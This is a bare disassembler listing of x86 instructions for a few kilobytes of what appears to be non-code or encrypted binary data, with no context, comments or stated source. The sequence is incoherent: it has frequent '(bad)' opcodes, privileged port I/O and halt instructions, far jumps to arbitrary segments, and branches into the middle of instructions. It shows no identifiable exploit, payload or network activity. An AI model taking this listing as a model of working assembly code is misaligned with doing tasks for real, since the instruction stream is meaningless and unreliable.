  40e050:	(bad)  [ebp+0xf]
  40e053:	shr    BYTE PTR [eax-0x1119264c],0xdd
  40e05a:	adc    DWORD PTR ds:0x27404d91,edi
  40e060:	adc    edx,ebx
  40e062:	cdq    
  40e063:	mov    ?,esi
  40e065:	nop
  40e066:	mov    dl,0x3e
  40e068:	mov    eax,0x79e10ffd
  40e06d:	jae    0x40dfff
  40e06f:	sbb    eax,0x8c8044b3
  40e074:	mov    edx,0x27fe6c38
  40e079:	mov    esi,0x33c48b8a
  40e07e:	test   BYTE PTR [edx+esi*4],dl
  40e081:	cmp    bh,BYTE PTR [edx]
  40e083:	rcl    BYTE PTR [ebp-0x6a],cl
  40e086:	outs   dx,DWORD PTR ds:[esi]
  40e087:	ret    0xe317
  40e08a:	daa    
  40e08b:	popa   
  40e08c:	dec    eax
  40e08d:	nop
  40e08e:	jbe    0x40e03f
  40e090:	sbb    ebx,ebp
  40e092:	jge    0x40e06d
  40e094:	mov    ecx,0x84b403d6
  40e099:	xchg   ecx,eax
  40e09a:	mov    ecx,0x38550a7c
  40e09f:	fistp  DWORD PTR cs:[edx+ebx*8-0xae50787]
  40e0a7:	mov    eax,ds:0xb5a09a83
  40e0ac:	icebp  
  40e0ad:	test   DWORD PTR [edi-0x207b389c],0xc96caeee
  40e0b7:	aaa    
  40e0b8:	mov    ch,0xd0
  40e0ba:	adc    eax,0x6e8fbc77
  40e0bf:	or     edx,edx
  40e0c1:	mov    eax,ds:0xda0894f9
  40e0c6:	ds test eax,0xc0aa51f5
  40e0cc:	fld    TBYTE PTR [esi-0x11]
  40e0cf:	xor    BYTE PTR [ebp+0x61c6cafc],al
  40e0d5:	jmp    0x40e0b3
  40e0d7:	xor    dl,cl
  40e0d9:	mov    eax,ds:0x1bdd40b6
  40e0de:	push   cs
  40e0df:	pop    ecx
  40e0e0:	mov    ch,0x3c
  40e0e2:	jg     0x40e0eb
  40e0e4:	repz push cs
  40e0e6:	dec    edi
  40e0e7:	ja     0x40e086
  40e0e9:	and    eax,0xc8b61aa3
  40e0ee:	xor    cl,0xd5
  40e0f1:	adc    edx,eax
  40e0f3:	sbb    ecx,DWORD PTR [edi+0x30f2e6d6]
  40e0f9:	mov    ds:0x221e767,al
  40e0fe:	or     BYTE PTR [ebx-0x1a869a11],al
  40e104:	mov    bl,0x81
  40e106:	mul    DWORD PTR [esi-0x73]
  40e109:	pushf  
  40e10a:	test   eax,0x77d62d8e
  40e10f:	cwde   
  40e110:	jmp    0x40e0ca
  40e112:	stc    
  40e113:	call   0xe47e3c7b
  40e118:	inc    ecx
  40e119:	xor    DWORD PTR [edi+0x2422fa10],0xffffff92
  40e120:	test   esp,0x1410261d
  40e126:	test   eax,ebp
  40e128:	loopne 0x40e0f3
  40e12a:	mov    ds:0x6b12b46b,eax
  40e12f:	loop   0x40e189
  40e131:	xchg   esi,eax
  40e132:	lahf   
  40e133:	xor    eax,0xdfb0a590
  40e138:	ins    DWORD PTR es:[edi],dx
  40e139:	dec    ecx
  40e13a:	rcr    BYTE PTR [ecx],cl
  40e13c:	jp     0x40e185
  40e13e:	adc    edx,DWORD PTR [edi]
  40e140:	mov    WORD PTR [edx+0x26a29f78],ds
  40e146:	inc    esp
  40e147:	hlt    
  40e148:	adc    bh,cl
  40e14a:	clc    
  40e14b:	add    eax,0x1cef9296
  40e150:	inc    edx
  40e151:	sbb    eax,0x51441ac3
  40e156:	add    esi,DWORD PTR [eax+0x35c93335]
  40e15c:	cld    
  40e15d:	call   0x2ec5:0x80e52426
  40e164:	cmp    eax,0xc12407c4
  40e169:	fcom   DWORD PTR [eax-0x17bbe07]
  40e16f:	ror    BYTE PTR [ebx-0x4d6619d],1
  40e175:	das    
  40e176:	pop    es
  40e177:	inc    eax
  40e178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e179:	(bad)  
  40e17a:	ss xor eax,0xd23b6846
  40e180:	cwde   
  40e181:	add    DWORD PTR [ecx-0x4ab76da7],esp
  40e187:	sub    ah,BYTE PTR [ebx+ebp*8]
  40e18a:	outs   dx,DWORD PTR ds:[esi]
  40e18b:	adc    BYTE PTR [esi-0x51a63539],ah
  40e191:	pop    eax
  40e192:	das    
  40e193:	sub    eax,0xbab71475
  40e198:	das    
  40e199:	or     DWORD PTR [ebp-0x505f6d3d],edi
  40e19f:	add    BYTE PTR [ebx+0x12e85aae],0xc0
  40e1a6:	jo     0x40e1a1
  40e1a8:	aaa    
  40e1a9:	xchg   esi,eax
  40e1aa:	pop    esi
  40e1ab:	loope  0x40e167
  40e1ad:	cmc    
  40e1ae:	dec    edi
  40e1af:	in     eax,dx
  40e1b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1b1:	inc    ecx
  40e1b2:	icebp  
  40e1b3:	jb     0x40e214
  40e1b5:	(bad)  
  40e1b6:	int3   
  40e1b7:	dec    esp
  40e1b8:	inc    ebp
  40e1b9:	cs add eax,ebp
  40e1bc:	ret    0x8479
  40e1bf:	mov    BYTE PTR [ecx+0x18f50014],ch
  40e1c5:	add    al,0xe5
  40e1c7:	enter  0xdfeb,0xdb
  40e1cb:	pop    ss
  40e1cc:	shr    ah,cl
  40e1ce:	or     edx,edi
  40e1d0:	push   ds
  40e1d1:	or     BYTE PTR [esp+ecx*2-0x12],0xd9
  40e1d6:	or     DWORD PTR [ecx+0x46cf8b70],edx
  40e1dc:	sub    eax,0xab244dfd
  40e1e1:	or     al,0xdc
  40e1e3:	(bad)  
  40e1e4:	dec    ebx
  40e1e5:	fdivr  st(1),st
  40e1e7:	int3   
  40e1e8:	pop    esi
  40e1e9:	push   eax
  40e1ea:	and    ch,BYTE PTR [edi-0x7b]
  40e1ed:	aad    0xb3
  40e1ef:	xor    eax,0xe24a2035
  40e1f4:	add    al,BYTE PTR ds:0xdbe3915f
  40e1fa:	in     eax,0x1
  40e1fc:	push   ebp
  40e1fd:	mov    ebp,0xe3caf31
  40e202:	sub    edi,ebp
  40e204:	adc    dh,BYTE PTR [ebx+0x5f48a6bc]
  40e20a:	inc    eax
  40e20b:	test   al,0x98
  40e20d:	and    BYTE PTR [eax-0x31346df5],cl
  40e213:	pop    edi
  40e214:	hlt    
  40e215:	pop    ds
  40e216:	push   0x1d
  40e218:	push   ecx
  40e219:	dec    edi
  40e21a:	ds in  al,0x62
  40e21d:	lock add BYTE PTR [esi],dh
  40e220:	mov    edi,0x4f1f1c5c
  40e225:	mov    WORD PTR [ecx-0x6a],?
  40e228:	push   ebp
  40e229:	lods   eax,DWORD PTR ds:[esi]
  40e22a:	out    0x2a,eax
  40e22c:	jecxz  0x40e282
  40e22e:	pop    ebx
  40e22f:	faddp  st(6),st
  40e231:	cmp    DWORD PTR [ebp+edx*4+0x1],0x19
  40e236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e237:	mov    WORD PTR [eax+0x7a],?
  40e23a:	jbe    0x40e217
  40e23c:	xchg   ebx,eax
  40e23d:	mov    esp,0x98bd1b23
  40e242:	not    BYTE PTR [edi]
  40e244:	sub    BYTE PTR [edx+0x7d],ch
  40e247:	mov    ds:0x33fd0a27,al
  40e24c:	sbb    DWORD PTR [ebx+0x34],edx
  40e24f:	push   ss
  40e250:	push   0xa4e82963
  40e255:	jge    0x40e26b
  40e257:	push   esi
  40e258:	push   esp
  40e259:	cwde   
  40e25a:	shl    BYTE PTR [eax-0x496fd1e],1
  40e260:	cld    
  40e261:	stos   DWORD PTR es:[edi],eax
  40e262:	repz inc edx
  40e264:	in     al,dx
  40e265:	mov    es,WORD PTR [ecx-0x42]
  40e268:	ret    0xce9
  40e26b:	sub    DWORD PTR [ecx+0x65],ebx
  40e26e:	dec    eax
  40e26f:	push   edx
  40e270:	dec    esi
  40e271:	sbb    DWORD PTR [ebp-0x6b2a137b],edx
  40e277:	jecxz  0x40e23a
  40e279:	pop    ss
  40e27a:	mov    si,0xef90
  40e27e:	adc    BYTE PTR [eax-0x23],ah
  40e281:	mov    ds:0xc56041ed,al
  40e286:	bound  eax,QWORD PTR ds:0x44a1627c
  40e28c:	push   esi
  40e28d:	mov    edx,0xd3c975a2
  40e292:	das    
  40e293:	leave  
  40e294:	xchg   edi,eax
  40e295:	popf   
  40e296:	mul    DWORD PTR [edx-0x3ac1d2ac]
  40e29c:	or     dl,BYTE PTR [esi-0x706e89f9]
  40e2a2:	sub    al,0x55
  40e2a4:	jne    0x40e2f1
  40e2a6:	jb     0x40e325
  40e2a8:	xor    bl,cl
  40e2aa:	pop    ebx
  40e2ab:	repz clc 
  40e2ad:	loop   0x40e23f
  40e2af:	shl    bl,0xc1
  40e2b2:	jmp    0x40e325
  40e2b4:	sbb    eax,0xf29bf7f8
  40e2b9:	repz adc ch,BYTE PTR [ecx+0x1d]
  40e2bd:	mov    esi,0xc307dd9d
  40e2c2:	std    
  40e2c3:	(bad)  
  40e2c4:	xor    al,0x91
  40e2c6:	pop    ds
  40e2c7:	or     eax,0xe9f2bfc0
  40e2cc:	cs dec edi
  40e2ce:	cmp    eax,0x5d023144
  40e2d3:	shr    DWORD PTR [edi],cl
  40e2d5:	scas   eax,DWORD PTR es:[edi]
  40e2d6:	(bad)  [edx]
  40e2d8:	and    DWORD PTR [esi+0x0],esi
  40e2db:	rcl    BYTE PTR [edx-0x25fbf06b],cl
  40e2e1:	stos   BYTE PTR es:[edi],al
  40e2e2:	fwait
  40e2e3:	sub    al,0xe3
  40e2e5:	and    edx,DWORD PTR [edx-0x34]
  40e2e8:	xchg   ecx,eax
  40e2e9:	xchg   edx,eax
  40e2ea:	loop   0x40e2ce
  40e2ec:	dec    ebp
  40e2ed:	loope  0x40e356
  40e2ef:	int3   
  40e2f0:	adc    eax,0x53bfcb6c
  40e2f5:	dec    eax
  40e2f6:	stos   BYTE PTR es:[edi],al
  40e2f7:	or     ax,WORD PTR [edi+ecx*8-0x4088ce64]
  40e2ff:	sub    bl,dl
  40e301:	shl    DWORD PTR [edx],0x16
  40e304:	pop    ss
  40e305:	das    
  40e306:	sbb    al,0x92
  40e308:	jl     0x40e310
  40e30a:	push   edi
  40e30b:	das    
  40e30c:	dec    ebx
  40e30d:	in     al,0x71
  40e30f:	xchg   edi,eax
  40e310:	sub    cl,BYTE PTR [edi]
  40e312:	mov    ebx,0x37768b68
  40e317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e319:	or     DWORD PTR [eax],esp
  40e31b:	add    DWORD PTR [esi],0x78381646
  40e321:	xor    DWORD PTR [eax],0x3d
  40e324:	and    eax,0xe97c4469
  40e329:	out    dx,eax
  40e32a:	push   0x17e22060
  40e32f:	mov    esi,0x1d3a21b5
  40e334:	mov    bl,0xe2
  40e336:	fmul   DWORD PTR [ecx-0x6a]
  40e339:	addr16 loop 0x40e3ac
  40e33c:	dec    edx
  40e33d:	cs dec ebx
  40e33f:	or     edi,ecx
  40e341:	mov    eax,0xe83a3ba9
  40e346:	pop    eax
  40e347:	fild   DWORD PTR [ebx+0x2d]
  40e34a:	ja     0x40e356
  40e34c:	ret    
  40e34d:	lea    ecx,[bx]
  40e350:	adc    eax,0x221f5ee9
  40e355:	lock ja 0x40e2e9
  40e358:	jle    0x40e3d8
  40e35a:	mov    ebp,0x9033afaa
  40e35f:	mov    cl,0x58
  40e361:	test   eax,0x232020e9
  40e366:	sbb    esi,0xffffff92
  40e369:	das    
  40e36a:	and    DWORD PTR [esi+0x5df9b0be],edx
  40e370:	(bad)  
  40e371:	jecxz  0x40e338
  40e373:	mov    ds:0x50e12961,al
  40e378:	adc    edi,0x4965f467
  40e37e:	idiv   DWORD PTR [edx-0x73f7a0ca]
  40e384:	pop    edi
  40e385:	and    BYTE PTR [ecx],al
  40e387:	mov    esi,0x1db2c80
  40e38c:	pop    ss
  40e38d:	popf   
  40e38e:	add    BYTE PTR [ecx],dh
  40e390:	int    0x85
  40e392:	xchg   esp,eax
  40e393:	dec    ecx
  40e394:	jno    0x40e344
  40e396:	xor    dl,BYTE PTR [ebx]
  40e398:	xor    al,0xee
  40e39a:	jo     0x40e3a1
  40e39c:	add    ecx,DWORD PTR ss:[ebx+0x71860f6e]
  40e3a3:	and    BYTE PTR [ebp-0x2b2d8df6],0x47
  40e3aa:	mov    eax,ds:0x7e0a0807
  40e3af:	fcomp  DWORD PTR [ebx]
  40e3b1:	xor    DWORD PTR [eax+0x73926982],ebp
  40e3b7:	aas    
  40e3b8:	iret   
  40e3b9:	pop    es
  40e3ba:	fadd   st,st(4)
  40e3bc:	jmp    0x40e3b6
  40e3be:	out    dx,eax
  40e3bf:	or     edx,DWORD PTR [edi+0x3271203e]
  40e3c5:	sbb    ch,BYTE PTR [ebp+0x25]
  40e3c8:	cwde   
  40e3c9:	pop    edx
  40e3ca:	shr    esi,cl
  40e3cc:	jne    0x40e396
  40e3ce:	mov    ah,0xf7
  40e3d0:	fcomp  DWORD PTR [ebx+0xdf6f91b]
  40e3d6:	jns    0x40e3ca
  40e3d8:	repnz or ebx,DWORD PTR es:[ebx-0xc]
  40e3dd:	cs mov ah,0xc2
  40e3e0:	jle    0x40e410
  40e3e2:	mov    edi,esi
  40e3e4:	vpsubusw xmm0,xmm3,XMMWORD PTR [ebx-0x6e]
  40e3e9:	push   edx
  40e3ea:	mov    bh,BYTE PTR [edx+ebp*2+0xae92856]
  40e3f1:	sub    BYTE PTR [edi-0x51651206],dh
  40e3f7:	xchg   ebx,eax
  40e3f8:	or     BYTE PTR [ebx-0x5048414b],bh
  40e3fe:	mov    ebp,0x1eda816e
  40e403:	call   DWORD PTR [ebx]
  40e405:	sub    al,0xfe
  40e407:	pop    edi
  40e408:	cmp    eax,0x9092230c
  40e40d:	int    0x88
  40e40f:	sub    al,BYTE PTR [edx]
  40e411:	jmp    0x510:0xe0162831
  40e418:	ja     0x40e44e
  40e41a:	fwait
  40e41b:	nop
  40e41c:	adc    ebx,DWORD PTR [edx+eax*2-0x5c]
  40e420:	nop
  40e421:	ret    
  40e422:	nop
  40e423:	mov    dl,0xe7
  40e425:	je     0x40e3df
  40e427:	(bad)  
  40e428:	gs or  al,bh
  40e42b:	mov    esp,0xb70904c3
  40e430:	and    al,cl
  40e432:	jo     0x40e3c7
  40e434:	icebp  
  40e435:	int3   
  40e436:	jne    0x40e47d
  40e438:	and    DWORD PTR [ecx+0x7e],eax
  40e43b:	mov    ah,0x47
  40e43d:	mov    ds:0xcffb691,al
  40e442:	clc    
  40e443:	aas    
  40e444:	adc    eax,0xc3c1b83b
  40e449:	sti    
  40e44a:	loopne 0x40e3dd
  40e44c:	loop   0x40e452
  40e44e:	sbb    DWORD PTR [ebp-0x80],0x68
  40e452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e453:	push   ebx
  40e454:	int3   
  40e455:	pusha  
  40e456:	sti    
  40e457:	cmc    
  40e458:	popa   
  40e459:	inc    esi
  40e45a:	add    BYTE PTR [edi-0x78],cl
  40e45d:	mov    dl,0x17
  40e45f:	mov    ebp,0xa2f17ecf
  40e464:	sub    ebp,DWORD PTR [ebx]
  40e466:	add    esp,edx
  40e468:	or     ch,BYTE PTR [ecx+0x139be145]
  40e46e:	icebp  
  40e46f:	adc    edi,edx
  40e471:	pop    es
  40e472:	loope  0x40e45c
  40e474:	div    DWORD PTR [edx]
  40e476:	jg     0x40e4e0
  40e478:	pop    ebp
  40e479:	pop    edi
  40e47a:	or     eax,0xcffce503
  40e47f:	add    cl,bh
  40e481:	adc    cl,dl
  40e483:	xlat   BYTE PTR ds:[ebx]
  40e484:	nop
  40e485:	es cmp al,0x27
  40e488:	inc    ebp
  40e489:	sbb    ebp,DWORD PTR [edi+ebp*2]
  40e48c:	sub    eax,0xad4bd2ee
  40e491:	xchg   BYTE PTR [edx+0x65adad95],dl
  40e497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e498:	call   0xcd5258e4
  40e49d:	mov    dh,0x5
  40e49f:	stos   BYTE PTR es:[edi],al
  40e4a0:	sub    BYTE PTR [ecx],bh
  40e4a2:	jae    0x40e42d
  40e4a4:	daa    
  40e4a5:	setnp  BYTE PTR [ebp-0x1f20ad2d]
  40e4ac:	cs push edi
  40e4ae:	test   al,0xf6
  40e4b0:	push   0x21
  40e4b2:	inc    eax
  40e4b3:	mov    bl,0xcb
  40e4b5:	lds    esp,FWORD PTR [ebp+0x6bd7ade7]
  40e4bb:	mov    eax,0xabffbc8e
  40e4c0:	push   esi
  40e4c1:	mov    ch,0x42
  40e4c3:	das    
  40e4c4:	xchg   ebx,eax
  40e4c5:	xor    ch,ch
  40e4c7:	pop    ebx
  40e4c8:	and    al,0xad
  40e4ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4cb:	and    DWORD PTR [eax+0x6a],ecx
  40e4ce:	push   es
  40e4cf:	(bad)  
  40e4d0:	push   eax
  40e4d1:	xchg   BYTE PTR [eax-0x1b],cl
  40e4d4:	sbb    BYTE PTR [edi],bh
  40e4d6:	aas    
  40e4d7:	xor    al,0x57
  40e4d9:	jg     0x40e47a
  40e4db:	not    DWORD PTR [eax+edi*2+0x54]
  40e4df:	sbb    dh,al
  40e4e1:	mov    edx,DWORD PTR ds:0x2e06cd42
  40e4e7:	in     al,0x3
  40e4e9:	mov    dh,0x11
  40e4eb:	or     al,0x7f
  40e4ed:	ja     0x40e505
  40e4ef:	(bad)  
  40e4f0:	rcr    BYTE PTR [edx-0x74],0xa9
  40e4f4:	dec    ecx
  40e4f5:	into   
  40e4f6:	mul    DWORD PTR [ebx-0x7]
  40e4f9:	mov    edx,0x9ca72bb7
  40e4fe:	imul   BYTE PTR [ebp+0x42]
  40e501:	sub    DWORD PTR [ecx],edi
  40e503:	mov    ah,BYTE PTR [ebp+0x72]
  40e506:	or     BYTE PTR [ebp-0x6db1a0e0],bl
  40e50c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e50d:	jnp    0x40e526
  40e50f:	fldcw  WORD PTR [eax+0x64]
  40e512:	push   es
  40e513:	mov    ebx,0xc0f97434
  40e518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e519:	add    BYTE PTR [ebp-0x2a596d24],bl
  40e51f:	mov    al,0x35
  40e521:	out    0xe4,al
  40e523:	adc    eax,0xeeac5686
  40e528:	inc    esp
  40e529:	cmc    
  40e52a:	shr    BYTE PTR [esi+0x40a01f60],1
  40e530:	shr    BYTE PTR [edi+0x567b75f3],0xa3
  40e537:	vmulsd xmm7,xmm2,QWORD PTR [ebp+eax*2-0x7a]
  40e53d:	sar    BYTE PTR [esi-0x283ff594],cl
  40e543:	lea    ebx,[edx]
  40e545:	or     ebx,DWORD PTR [eax-0x12b830dd]
  40e54b:	adc    esi,edi
  40e54d:	inc    eax
  40e54e:	retf   0xf22a
  40e551:	out    0x26,al
  40e553:	jbe    0x40e54a
  40e555:	mov    al,0xdf
  40e557:	xlat   BYTE PTR ds:[ebx]
  40e558:	cs into 
  40e55a:	in     eax,dx
  40e55b:	pop    es
  40e55c:	int3   
  40e55d:	inc    eax
  40e55e:	out    0x62,eax
  40e560:	test   al,0x69
  40e562:	mov    ebp,0xfab61f07
  40e567:	or     al,0xe
  40e569:	fstp   DWORD PTR ds:0xbe3278b8
  40e56f:	mov    ecx,0xb289172d
  40e574:	repnz es shr bl,0xe1
  40e579:	mov    ds:0x8ae5d449,al
  40e57e:	inc    esp
  40e57f:	test   BYTE PTR [esi],cl
  40e581:	pop    ss
  40e582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e583:	xchg   ebp,eax
  40e584:	loope  0x40e601
  40e586:	cwde   
  40e587:	inc    esp
  40e588:	dec    ebp
  40e589:	mov    BYTE PTR [edi],bl
  40e58b:	inc    eax
  40e58c:	add    DWORD PTR ds:0x17cdab2e,edi
  40e592:	test   eax,0xad27bb4b
  40e597:	jmp    0xa684ae50
  40e59c:	(bad)  [eax]
  40e59e:	shl    BYTE PTR [edi+0x5d],1
  40e5a1:	test   DWORD PTR [esi],eax
  40e5a3:	adc    BYTE PTR [eax+0x4],0x3a
  40e5a7:	jne    0x40e5f4
  40e5a9:	lds    edx,FWORD PTR [ecx+0x10ff5214]
  40e5af:	js     0x40e5c4
  40e5b1:	into   
  40e5b2:	inc    ecx
  40e5b3:	mov    es,WORD PTR [ecx+0x3f]
  40e5b6:	and    eax,0xb10f6e9a
  40e5bb:	cmc    
  40e5bc:	or     edi,DWORD PTR ds:0xa7131bee
  40e5c2:	sahf   
  40e5c3:	test   BYTE PTR [esi-0x2],bh
  40e5c6:	push   eax
  40e5c7:	pop    eax
  40e5c8:	or     eax,0x5d98b2dc
  40e5cd:	dec    ecx
  40e5ce:	call   0xcb3c:0x80eccc4d
  40e5d5:	mov    ebx,fs
  40e5d7:	into   
  40e5d8:	cmp    DWORD PTR [eax-0x8],0xffffffc4
  40e5dc:	jns    0x40e59b
  40e5de:	in     eax,dx
  40e5df:	sub    bl,cl
  40e5e1:	adc    eax,0xc0ba8aa5
  40e5e6:	mov    ebx,0xd7ae2ca3
  40e5eb:	add    al,0x29
  40e5ed:	mov    ds:0x208cecd2,eax
  40e5f2:	shl    BYTE PTR [esi+esi*2-0x4167db33],cl
  40e5f9:	outs   dx,BYTE PTR ds:[esi]
  40e5fa:	xchg   ebx,eax
  40e5fb:	inc    dl
  40e5fd:	mov    ebx,0xeb397649
  40e602:	xchg   esi,eax
  40e603:	ja     0x40e62d
  40e605:	es jmp 0x8911ad61
  40e60b:	mov    edi,0xa293b81e
  40e610:	faddp  st(0),st
  40e612:	mov    ebx,0x5f5582e5
  40e617:	push   ebp
  40e618:	fs stos BYTE PTR es:[edi],al
  40e61a:	fild   DWORD PTR [edx-0x5475339e]
  40e620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e621:	pop    esp
  40e622:	or     eax,0x4365f28c
  40e627:	retf   0xa2c1
  40e62a:	ins    DWORD PTR es:[edi],dx
  40e62b:	out    dx,eax
  40e62c:	mov    ah,0x23
  40e62e:	cmp    ecx,edx
  40e630:	jae    0x40e5d6
  40e632:	cmc    
  40e633:	lahf   
  40e634:	mov    WORD PTR [ebp+eax*1+0x649117d],es
  40e63b:	mov    esp,0xa67e1365
  40e640:	je     0x40e60a
  40e642:	(bad)  
  40e643:	or     al,0xa5
  40e645:	es pop ecx
  40e647:	jl     0x40e610
  40e649:	mov    ah,0xd8
  40e64b:	pop    esi
  40e64c:	fidivr WORD PTR ds:0x3a908d85
  40e652:	jmp    0xf72e:0xc6899cdb
  40e659:	mov    WORD PTR [edx-0x44],?
  40e65c:	dec    eax
  40e65d:	push   esi
  40e65e:	jne    0x40e60c
  40e660:	ja     0x40e613
  40e662:	add    BYTE PTR [ebx+0x1b7fc7e],bl
  40e668:	add    BYTE PTR [ecx],ah
  40e66a:	mov    al,ds:0xedeecb32
  40e66f:	in     al,dx
  40e670:	in     al,dx
  40e671:	or     DWORD PTR [ecx-0x57020876],esp
  40e677:	shl    BYTE PTR [edx+0x53],cl
  40e67a:	pop    esi
  40e67b:	retf   
  40e67c:	out    0x59,eax
  40e67e:	add    al,0x6a
  40e680:	sti    
  40e681:	out    0x80,eax
  40e683:	push   edi
  40e684:	into   
  40e685:	inc    ecx
  40e686:	lahf   
  40e687:	in     al,dx
  40e688:	lods   al,BYTE PTR ds:[esi]
  40e689:	cs or  al,0xb8
  40e68c:	rcr    DWORD PTR [ecx+0x48612e0a],1
  40e692:	stos   BYTE PTR es:[edi],al
  40e693:	or     al,0x73
  40e695:	iret   
  40e696:	mov    bl,0x2
  40e698:	iret   
  40e699:	leave  
  40e69a:	lea    esp,[ecx]
  40e69c:	mov    dl,0xf7
  40e69e:	cmp    al,0xee
  40e6a0:	mov    eax,ds:0xe208d8e9
  40e6a5:	add    DWORD PTR [esi],edi
  40e6a7:	mov    ecx,0xd03e1620
  40e6ac:	mov    ah,0x6e
  40e6ae:	outs   dx,DWORD PTR gs:[esi]
  40e6b0:	sahf   
  40e6b1:	(bad)  
  40e6b2:	sub    ebp,DWORD PTR [edi]
  40e6b4:	inc    edi
  40e6b5:	leave  
  40e6b6:	push   ds
  40e6b7:	push   esp
  40e6b8:	outs   dx,BYTE PTR ds:[esi]
  40e6b9:	retf   0x97c9
  40e6bc:	cdq    
  40e6bd:	xchg   ebp,eax
  40e6be:	rcl    bh,cl
  40e6c0:	bound  eax,QWORD PTR [ebx-0x29]
  40e6c3:	or     al,0x1a
  40e6c5:	ret    
  40e6c6:	shr    DWORD PTR [edi+0x65],cl
  40e6c9:	cmp    dh,BYTE PTR [ebx+0x1ac830e1]
  40e6cf:	aad    0x18
  40e6d1:	pop    es
  40e6d2:	out    dx,al
  40e6d3:	jae    0x40e719
  40e6d5:	test   BYTE PTR [eax],0x44
  40e6d8:	das    
  40e6d9:	(bad)  
  40e6da:	fisttp QWORD PTR [edx]
  40e6dc:	or     DWORD PTR [esi],0xb34d763d
  40e6e2:	add    DWORD PTR [esi-0x52],ebp
  40e6e5:	xchg   ebp,eax
  40e6e6:	sti    
  40e6e7:	enter  0xd696,0xd2
  40e6eb:	sbb    edi,DWORD PTR [eax+ecx*2+0x0]
  40e6ef:	sbb    BYTE PTR [edx+0x53],bl
  40e6f2:	outs   dx,DWORD PTR ds:[esi]
  40e6f3:	fadd   DWORD PTR [edx-0x4a]
  40e6f6:	dec    eax
  40e6f7:	les    edi,FWORD PTR [eax+0x714d1d0a]
  40e6fd:	daa    
  40e6fe:	dec    esp
  40e6ff:	xchg   esp,eax
  40e700:	xchg   esi,eax
  40e701:	xor    BYTE PTR [ecx],dh
  40e703:	adc    eax,DWORD PTR [ebx]
  40e705:	sub    eax,0x22fdf87
  40e70a:	sbb    dl,BYTE PTR [edi+0xa]
  40e70d:	mov    al,ds:0xcfe4b0ab
  40e712:	mov    ecx,0xe12317a5
  40e717:	mov    bl,BYTE PTR [esi-0x28]
  40e71a:	mov    BYTE PTR [esi-0x581dc90e],al
  40e720:	dec    esi
  40e721:	mov    cl,0xf6
  40e723:	sbb    BYTE PTR [esi-0xc],0xf1
  40e727:	xchg   esi,eax
  40e728:	imul   edx,DWORD PTR [edx+0x65],0xc6f66234
  40e72f:	push   esi
  40e730:	inc    edx
  40e731:	adc    eax,0xac63dc89
  40e736:	jecxz  0x40e7af
  40e738:	pop    ds
  40e739:	loope  0x40e790
  40e73b:	or     BYTE PTR [ebp+0x3e],al
  40e73e:	fnsave [ebx+0x11]
  40e741:	xchg   esp,eax
  40e742:	adc    esi,DWORD PTR [edi-0x46d0fdb9]
  40e748:	sub    al,0xa3
  40e74a:	rol    bl,cl
  40e74c:	pushf  
  40e74d:	fwait
  40e74e:	mov    dl,0x3c
  40e750:	scas   al,BYTE PTR es:[edi]
  40e751:	fcom   QWORD PTR [ecx-0x78271981]
  40e757:	ins    WORD PTR es:[edi],dx
  40e759:	mov    esp,0x924d0327
  40e75e:	(bad)  
  40e75f:	clc    
  40e760:	pop    ecx
  40e761:	call   0xab55:0xd0deb290
  40e768:	fcmovnu st,st(0)
  40e76a:	xchg   edi,eax
  40e76b:	adc    al,BYTE PTR [edi-0x40]
  40e76e:	add    bh,cl
  40e770:	sbb    BYTE PTR [edx+0x31c708ee],cl
  40e776:	xor    DWORD PTR [ebx+0x671779bd],ecx
  40e77c:	mov    ds:0x31e7698a,eax
  40e781:	retf   
  40e782:	sub    BYTE PTR [ecx+0x2c],ch
  40e785:	mov    bl,dh
  40e787:	xchg   esp,eax
  40e788:	fwait
  40e789:	or     al,0x96
  40e78b:	xchg   edx,eax
  40e78c:	sti    
  40e78d:	jns    0x40e758
  40e78f:	enterw 0xcee0,0xee
  40e794:	and    BYTE PTR [edi+0x22],bl
  40e797:	aam    0x5a
  40e799:	fisub  WORD PTR [ebx-0x2f]
  40e79c:	(bad)  
  40e79e:	sub    ch,BYTE PTR [edx]
  40e7a0:	or     esi,DWORD PTR [edi-0x21]
  40e7a3:	or     BYTE PTR [eax],bh
  40e7a5:	cmp    eax,0x9fe0b2b4
  40e7aa:	push   ds
  40e7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7ac:	mov    cl,0xa1
  40e7ae:	xchg   edx,eax
  40e7af:	ret    
  40e7b0:	lock mov edi,0x501e73c2
  40e7b6:	push   edi
  40e7b7:	addr16 mov bl,0x5d
  40e7ba:	lods   eax,DWORD PTR ds:[esi]
  40e7bb:	popa   
  40e7bc:	inc    ebx
  40e7bd:	cmp    al,BYTE PTR ds:0xf23fe18
  40e7c3:	test   al,0xea
  40e7c5:	outs   dx,DWORD PTR ds:[esi]
  40e7c6:	xchg   edx,eax
  40e7c7:	fist   WORD PTR [edi+ebp*1+0x3e28ac70]
  40e7ce:	push   ecx
  40e7cf:	sub    ebx,DWORD PTR [edi+ebp*1+0x57]
  40e7d3:	in     al,dx
  40e7d4:	out    dx,eax
  40e7d5:	xchg   DWORD PTR [ebx-0x16],ecx
  40e7d8:	cdq    
  40e7d9:	jne    0x40e805
  40e7db:	xorps  xmm2,XMMWORD PTR ds:[ebx]
  40e7df:	test   DWORD PTR [ebx],esi
  40e7e1:	in     eax,0xfb
  40e7e3:	cmp    BYTE PTR [ecx-0x1d0de332],dl
  40e7e9:	mov    ecx,DWORD PTR [edi+edi*8-0x1d]
  40e7ed:	in     al,0x6
  40e7ef:	push   ds
  40e7f0:	pusha  
  40e7f1:	addr16 sub eax,0xeb3c2bb2
  40e7f7:	inc    edx
  40e7f8:	icebp  
  40e7f9:	popa   
  40e7fa:	inc    ebp
  40e7fb:	xor    al,0xee
  40e7fd:	push   es
  40e7fe:	mov    ebx,0x1b958619
  40e804:	jae    0x40e79c
  40e806:	lods   al,BYTE PTR ds:[esi]
